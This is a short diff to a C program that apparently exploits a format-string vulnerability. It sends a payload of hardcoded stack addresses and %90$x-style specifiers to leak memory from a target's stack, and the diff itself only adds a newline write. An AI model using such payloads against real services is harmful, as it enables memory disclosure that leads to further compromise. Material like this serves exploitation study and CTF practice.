@@ -121,6 +121,7 @@ int main(int argc, char* argv[]) {
 
    // print something from the stack
    put_bin("e BBBBBB\xde\xef\xff\xbfJUNK\xdc\xef\xff\xbf %90$x %91$x %92$x", 38);
+   put_str("\n");
    //put_str(buf);
    send();
 
